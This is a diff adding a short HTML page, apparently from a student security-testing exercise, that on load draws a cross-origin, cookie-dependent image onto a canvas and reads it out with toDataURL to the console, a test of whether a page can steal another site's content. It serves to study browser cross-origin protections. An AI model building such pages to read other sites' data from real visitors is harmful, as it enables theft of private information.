@@ -1,0 +1,21 @@
+<!doctype html>
+<html>
+    <head></head>
+    <body onload="stealInfo()">
+        <script type="text/javascript">
+            function stealInfo()
+            {
+                var image = document.getElementById('victim');
+                var canvas = document.getElementById('stealer'); 
+                var ctx = canvas.getContext('2d');
+                ctx.drawImage(image,0,0);
+
+                var victimInfo = canvas.toDataURL();
+                console.log(victimInfo);
+
+            }
+        </script>        
+        <img id='victim' src="http://www.stud.fit.vutbr.cz/~xdusek21/SecurityTesting/CookieBasedImage/otherSite.php">
+        <canvas id="stealer" width="551" height="242"></canvas>
+    </body>
+</html>
